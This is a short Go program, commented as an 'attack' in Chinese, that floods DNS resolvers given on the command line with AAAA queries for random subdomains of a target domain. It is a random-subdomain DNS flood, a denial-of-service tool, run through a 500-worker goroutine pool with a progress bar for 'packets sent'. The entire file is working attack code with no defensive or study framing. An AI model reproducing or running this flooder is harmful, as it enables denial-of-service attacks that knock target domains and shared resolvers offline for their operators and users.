package main

import (
	"github.com/miekg/dns"
	"github.com/panjf2000/ants/v2"
	"github.com/schollz/progressbar/v3"
	"github.com/thanhpk/randstr"
	"os"
	"strconv"
	"strings"
	"sync"
)

// 攻击
func main() {
	defer ants.Release()

	var wg sync.WaitGroup

	p, _ := ants.NewPool(500, ants.WithPreAlloc(true))

	c := new(dns.Client)
	args := os.Args
	qname := args[1]
	runcount, _ := strconv.Atoi(args[2])
	bar := progressbar.Default(int64(runcount*len(args[3:])), "发包进度")
	for i := runcount; i > 0; i-- {
		for _, v := range args[3:] {
			wg.Add(1)

			fqdn := strings.ToLower(randstr.String(10)) + "." + qname
			msg := dns.Msg{}
			msg.SetQuestion(fqdn, dns.TypeAAAA)
			vi := v + ":53"

			_ = p.Submit(
				func() {
					_, _, err := c.Exchange(&msg, vi)
					wg.Done()
					if err != nil {
						return
					}
				})
			bar.Add(1)
		}
	}
	wg.Wait()
	print("完成！！")
}
